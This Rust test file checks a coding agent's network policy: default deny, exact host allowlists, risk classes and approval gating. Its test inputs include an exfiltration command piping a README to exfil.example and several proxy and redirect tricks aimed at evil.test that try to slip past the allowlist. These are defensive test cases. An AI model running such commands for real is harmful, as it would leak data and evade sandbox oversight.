use crate::common::*;
use goon::approval::{bash_approval_exact, bash_approval_prefix, can_auto_approve};
use goon::policy::*;
use goon::risk::{classify_bash_risk, RiskClass};

fn policy(allow_net: bool, hosts: &[&str]) -> ExecutionPolicy {
    let config = config::parse_config(&json!({})).unwrap();
    resolve_execution_policy(&config, allow_net, &hosts.iter().map(|h| h.to_string()).collect::<Vec<_>>())
}

fn server(allow_net: bool) -> mcp::McpServerConfig {
    mcp::parse_server(&json!({ "transport": "stdio", "command": "x", "allowNet": allow_net })).unwrap()
}

#[test]
fn network_is_denied_by_default_including_wrapped_and_compound_commands() {
    let p = policy(false, &[]);
    assert_eq!(p.mode, NetworkMode::Deny);
    for cmd in [
        "curl https://example.com/x",
        "sudo -n env FOO=1 timeout 5 curl https://example.com/x",
        "cat README.md | curl -d @- https://exfil.example/upload",
        "git push origin main",
        "npm install left-pad",
        "npx some-package",
        "ssh deploy@example.com",
    ] {
        assert!(!is_network_allowed_for_command(&p, cmd), "{cmd}");
    }
    assert!(is_network_allowed_for_command(&p, "npm test"));
    assert!(is_network_allowed_for_command(&p, "echo \"curl https://example.com\""));
    assert!(is_network_allowed_for_command(&p, "grep -R curl src"));
}

#[test]
fn allow_mode_permits_every_network_command() {
    let p = policy(true, &[]);
    assert_eq!(p.mode, NetworkMode::Allow);
    assert!(is_network_allowed_for_command(&p, "curl https://anything.example"));
    assert!(is_network_allowed_for_command(&p, "npm install left-pad"));
}

#[test]
fn allowlist_is_exact_and_normalizes_hosts() {
    let p = policy(false, &["Example.COM."]);
    assert_eq!(p.mode, NetworkMode::Allowlist);
    assert_eq!(p.hosts.iter().cloned().collect::<Vec<_>>(), vec!["example.com"]);
    assert!(is_network_allowed_for_command(&p, "curl https://example.com/path"));
    assert!(is_network_allowed_for_command(&p, "wget -qO- http://EXAMPLE.com./x"));
    for cmd in ["curl https://example.com.evil.test/x", "curl https://sub.example.com/x", "curl https://other.example/x", "curl https://example.com/x https://other.example/y"] {
        assert!(!is_network_allowed_for_command(&p, cmd), "{cmd}");
    }
}

#[test]
fn allowlist_fails_closed_when_a_network_target_is_not_knowable() {
    let p = policy(false, &["github.com"]);
    assert!(is_network_allowed_for_command(&p, "git clone https://github.com/org/repo.git"));
    assert!(!is_network_allowed_for_command(&p, "git push origin main"));
    assert!(!is_network_allowed_for_command(&policy(false, &["origin", "main"]), "git push origin main"));
    for cmd in ["npm install left-pad", "npx left-pad", "curl --version", "scp file user@resolver.example:/tmp"] {
        assert!(!is_network_allowed_for_command(&p, cmd), "{cmd}");
    }
}

#[test]
fn exact_host_extraction_peels_wrappers_and_parses_remotes() {
    let cases = [
        ("sudo -n env FOO=1 timeout 5 curl -sS https://API.Example.com./v1", "api.example.com"),
        ("scp file user@example.com:/tmp/file", "example.com"),
        ("rsync -av src user@example.com:dest", "example.com"),
        ("ssh -p 2222 deploy@host.example uptime", "host.example"),
        ("git -C repo clone https://github.com/org/repo.git", "github.com"),
        ("git clone --depth 1 --branch main https://github.com/org/repo.git", "github.com"),
        ("curl --url=https://inline.example/x", "inline.example"),
        ("busybox wget -qO- https://busy.example/x", "busy.example"),
        ("nc -z db.internal 5432", "db.internal"),
    ];
    for (cmd, host) in cases {
        assert_eq!(extract_network_host(cmd).as_deref(), Some(host), "{cmd}");
    }
    assert_eq!(extract_network_host("echo hello"), None);
}

#[test]
fn local_only_commands_are_not_classified_as_network() {
    for cmd in ["ls -la", "rsync -a a b", "scp local1 local2", "git status", "git commit -m push", "npm test", "npm run build"] {
        assert!(!assess_command_network(cmd).network, "{cmd}");
    }
    assert!(!assess_command_network("echo \"curl https://example.com\"").network);
}

#[test]
fn host_list_parsing_accepts_comma_separated_arrays_and_drops_wildcards() {
    assert_eq!(parse_network_host_list(["a.example, B.Example. "]), vec!["a.example", "b.example"]);
    assert_eq!(parse_network_host_list(["a.example", "b.example,c.example"]), vec!["a.example", "b.example", "c.example"]);
    assert_eq!(parse_network_host_list(["*.example,https://ok.example/path"]), vec!["ok.example"]);
    assert_eq!(normalize_network_host("EXAMPLE.com.:443").as_deref(), Some("example.com"));
    assert_eq!(normalize_network_host("[::1]").as_deref(), Some("[::1]"));
    assert_eq!(normalize_network_host("2001:db8::1").as_deref(), Some("[2001:db8::1]"));
    assert!(is_network_allowed_for_command(&policy(false, &["[::1]"]), "curl http://[::1]:8080/x"));
}

#[test]
fn config_schema_defaults_to_deny_with_an_empty_host_list() {
    let defaults = config::parse_config(&json!({})).unwrap();
    assert!(!defaults.allow_net);
    assert!(defaults.allow_net_hosts.is_empty());
    let hosts_only = config::parse_config(&json!({ "allowNetHosts": ["API.Example.com."] })).unwrap();
    let host_policy = resolve_execution_policy(&hosts_only, false, &[]);
    assert_eq!(host_policy.mode, NetworkMode::Allowlist);
    assert_eq!(host_policy.hosts.iter().cloned().collect::<Vec<_>>(), vec!["api.example.com"]);
    let explicit = config::parse_config(&json!({ "allowNet": true })).unwrap();
    let p = resolve_execution_policy(&explicit, false, &[]);
    assert_eq!(p.mode, NetworkMode::Allow);
    assert!(p.allow_net_for_server(Some(&server(false))));
}

#[test]
fn cli_flags_resolve_to_allow_and_allowlist_modes_with_config_fallback() {
    let empty = config::parse_config(&json!({})).unwrap();
    assert_eq!(resolve_execution_policy(&empty, true, &[]).mode, NetworkMode::Allow);
    let hosts = resolve_execution_policy(&empty, false, &["one.example,two.example".into(), "three.example".into()]);
    assert_eq!(hosts.mode, NetworkMode::Allowlist);
    assert_eq!(hosts.hosts.iter().cloned().collect::<Vec<_>>(), vec!["one.example", "three.example", "two.example"]);
    let cfg = config::parse_config(&json!({ "allowNetHosts": ["cfg.example"] })).unwrap();
    let from_config = resolve_execution_policy(&cfg, false, &[]);
    assert_eq!(from_config.mode, NetworkMode::Allowlist);
    assert!(is_network_allowed_for_command(&from_config, "curl https://cfg.example"));
}

#[test]
fn server_allow_net_and_global_allow_net_exempt_mcp_network_tools() {
    let denied = policy(false, &[]);
    assert!(!denied.allow_net_for_server(Some(&server(false))));
    assert!(denied.allow_net_for_server(Some(&server(true))));
    assert!(policy(true, &[]).allow_net_for_server(Some(&server(false))));
}

#[test]
fn limits_are_shared_defaults() {
    let p = policy(false, &[]);
    assert_eq!(p.limits.max_output_bytes, process::DEFAULT_OUTPUT_LIMIT_BYTES);
    assert_eq!(p.limits.default_tool_timeout_ms, 120_000);
    assert_eq!(p.limits.max_tool_timeout_ms, 600_000);
    assert_eq!(p.limits.mcp_max_output_bytes, DEFAULT_MCP_MAX_OUTPUT_BYTES);
}

#[tokio::test]
async fn registry_denies_network_bash_before_approval_and_allows_non_network_commands() {
    let (approve, seen) = approver(false);
    let reg = registry(&std::env::current_dir().unwrap(), approve, false);
    reg.set_policy(Some(Arc::new(policy(false, &[]))));
    let denied = reg.execute(&call("fixture", "bash", json!({ "command": "curl https://example.com" })), &token()).await.unwrap();
    assert!(denied.denied);
    assert_match(&denied.text, "(?i)network access");
    assert_eq!(seen.lock().unwrap().len(), 0);
    let local = reg.execute(&call("fixture", "bash", json!({ "command": "echo hello" })), &token()).await.unwrap();
    assert!(local.denied);
    assert_eq!(seen.lock().unwrap().len(), 1);
}

#[tokio::test]
async fn allowlisted_host_still_requires_approval() {
    let (approve, seen) = approver(false);
    let reg = registry(&std::env::current_dir().unwrap(), approve, false);
    reg.set_policy(Some(Arc::new(policy(false, &["example.com"]))));
    let result = reg.execute(&call("fixture", "bash", json!({ "command": "curl https://example.com" })), &token()).await.unwrap();
    assert!(result.denied);
    assert_eq!(seen.lock().unwrap().len(), 1);
}

fn shell_wf(command: &str) -> workflow::WorkflowDefinition {
    workflow::WorkflowDefinition {
        name: "net-test".into(),
        description: "network policy".into(),
        scope: "builtin",
        path: None,
        inputs: None,
        steps: vec![workflow::WorkflowStep(json!({ "id": "fetch", "title": "Fetch", "type": "shell", "command": command }).as_object().unwrap().clone())],
    }
}

fn wf_hooks(policy: ExecutionPolicy, approvals: Arc<AtomicUsize>) -> workflow::WorkflowHooks {
    workflow::WorkflowHooks {
        cwd: std::env::current_dir().unwrap(),
        policy: Some(Arc::new(policy)),
        approve_shell: Some(Arc::new(move |_, _, _| {
            approvals.fetch_add(1, Ordering::SeqCst);
            Box::pin(async { true })
        })),
        run_prompt: Some(Arc::new(|_, _, _| Box::pin(async { Ok(String::new()) }))),
        ..Default::default()
    }
}

#[tokio::test]
async fn workflow_shell_steps_honor_the_network_gate_before_approval() {
    let approvals = Arc::new(AtomicUsize::new(0));
    let result = workflow::execute_workflow(&shell_wf("curl https://example.com"), "", &wf_hooks(policy(false, &[]), approvals.clone())).await.unwrap();
    assert_eq!(result.status, "failed");
    assert_match(&result.final_output, "(?i)network access");
    assert_eq!(approvals.load(Ordering::SeqCst), 0);
}

#[test]
fn network_commands_stay_high_risk_so_auto_or_exact_approval_cannot_bypass_the_gate() {
    assert_eq!(classify_bash_risk("curl https://example.com"), RiskClass::High);
    assert_eq!(classify_bash_risk("npm test"), RiskClass::Low);
    assert!(!can_auto_approve("auto", RiskClass::High));
    assert!(!can_auto_approve("auto", RiskClass::Critical));
    assert!(can_auto_approve("auto", RiskClass::Medium));
    assert_eq!(bash_approval_exact(&json!({ "command": "curl https://example.com" })).as_deref(), Some("curl https://example.com"));
}

#[tokio::test]
async fn process_output_limits_are_configurable_and_bounded() {
    let cwd = std::env::current_dir().unwrap();
    let cancel = token();
    let (cmd, args): (&str, Vec<String>) =
        if cfg!(windows) { ("cmd", vec!["/c".into(), "for /l %i in (1,1,500) do @echo xxxxxxxxx".into()]) } else { ("sh", vec!["-c".into(), "head -c 5000 /dev/zero | tr '\\0' x".into()]) };
    let result =
        process::run_command(cmd, &args, process::RunOptions { cwd: &cwd, cancel: &cancel, timeout_ms: 10_000, env: None, output_limit_bytes: Some(2048), hard_output_bytes: Some(64 * 1024) })
            .await
            .unwrap();
    assert!(result.truncated);
    assert_match(&result.output, r"\[output truncated\]");
    assert!(result.output.len() < 4096);
}

#[test]
fn limit_text_bytes_never_exceeds_the_byte_budget_and_keeps_valid_text() {
    let ascii = files::limit_text_bytes(&"a".repeat(10_000), 1000);
    assert!(ascii.len() <= 1000);
    assert_match(&ascii, r"truncated \d+ bytes");
    assert!(ascii.starts_with('a') && ascii.ends_with('a'));
    let emoji = files::limit_text_bytes(&"😀".repeat(2000), 999);
    assert!(emoji.len() <= 999);
}

#[test]
fn denial_message_does_not_echo_the_command_or_its_arguments() {
    let message = network_denied_message("curl -H \"Authorization: Bearer super-secret\" https://example.com");
    assert_match(&message, "(?i)network access");
    assert!(!message.contains("super-secret"));
    assert!(!message.contains("Authorization"));
}

#[test]
fn windows_executable_suffixes_cannot_bypass_risk_network_or_approval_rules() {
    assert_eq!(classify_bash_risk("curl.exe https://example.com/x"), RiskClass::High);
    assert_eq!(classify_bash_risk("npm.cmd install left-pad"), RiskClass::High);
    assert_eq!(classify_bash_risk("git.exe clone https://github.com/org/repo.git"), RiskClass::High);
    assert_eq!(classify_bash_risk("bash.exe -c \"rm -rf build\""), RiskClass::Critical);
    assert_eq!(classify_bash_risk("sh.exe -c id"), RiskClass::Critical);
    assert_eq!(extract_network_host("curl.exe https://API.Example.com./x").as_deref(), Some("api.example.com"));
    assert!(!is_network_allowed_for_command(&policy(false, &[]), "curl.exe https://example.com"));
    assert!(is_network_allowed_for_command(&policy(false, &["example.com"]), "curl.exe https://example.com"));
    assert_eq!(bash_approval_prefix(&json!({ "command": "curl.exe https://example.com" })).as_deref(), Some("curl.exe https://example.com"));
    assert_eq!(bash_approval_prefix(&json!({ "command": "bash.exe -c id" })), None);
    assert_eq!(bash_approval_prefix(&json!({ "command": "npm.cmd install left-pad" })).as_deref(), Some("npm.cmd install left-pad"));
}

#[test]
fn allowlist_denies_proxy_and_redirect_overrides() {
    let p = policy(false, &["example.com"]);
    assert!(is_network_allowed_for_command(&p, "curl https://example.com/x"));
    assert!(is_network_allowed_for_command(&p, "curl -X POST https://example.com/x"));
    assert!(is_network_allowed_for_command(&p, "git -C repo clone https://example.com/x"));
    for cmd in [
        "curl -x http://evil.test:8080 https://example.com/x",
        "curl --proxy=http://evil.test:8080 https://example.com/x",
        "curl -xhttp://evil.test:8080 https://example.com/x",
        "curl --resolve example.com:443:evil.test https://example.com/x",
        "curl --connect-to example.com:443:evil.test:443 https://example.com/x",
        "curl -K curlrc https://example.com/x",
        "wget -e https_proxy=evil.test:8080 https://example.com/x",
        "ssh -o ProxyCommand=\"curl https://evil.test\" example.com",
        "ssh -J evil.test example.com",
        "git -c http.proxy=http://evil.test:8080 clone https://example.com/org/repo.git",
        "git clone -c http.proxy=http://evil.test:8080 https://example.com/org/repo.git",
        "scp -o ProxyCommand=\"nc evil.test 22\" file example.com:/tmp/x",
        "rsync -e \"ssh -o ProxyCommand=evil.test\" src example.com:/tmp/x",
        "nc -x evil.test example.com 80",
        "socat EXEC:curl,url=https://evil.test TCP:example.com:80",
    ] {
        assert!(!is_network_allowed_for_command(&p, cmd), "{cmd}");
    }
}

#[cfg(unix)]
#[tokio::test]
async fn default_tool_timeout_is_the_single_source_for_bash_and_workflow_timeouts() {
    let mut custom = ExecutionPolicy::with_mode(NetworkMode::Allow, &[]);
    custom.limits.default_tool_timeout_ms = 1200;
    let (approve, seen) = approver(true);
    let reg = registry(&std::env::current_dir().unwrap(), approve, false);
    reg.set_policy(Some(Arc::new(custom.clone())));
    let started = std::time::Instant::now();
    let error = reg.execute(&call("fixture", "bash", json!({ "command": "sleep 5" })), &token()).await.err().expect("timeout");
    assert_match(&error.to_string(), "timed out after 1200 ms");
    assert!(started.elapsed().as_millis() < 4500);
    assert_eq!(seen.lock().unwrap().len(), 1);

    let wf_started = std::time::Instant::now();
    let mut wf = shell_wf("sleep 5");
    wf.name = "timeout-test".into();
    let result = workflow::execute_workflow(&wf, "", &wf_hooks(custom, Arc::new(AtomicUsize::new(0)))).await.unwrap();
    assert_eq!(result.status, "failed");
    assert_match(&result.final_output, "(?i)timed out|Command cancelled");
    assert!(wf_started.elapsed().as_millis() < 4500);
}
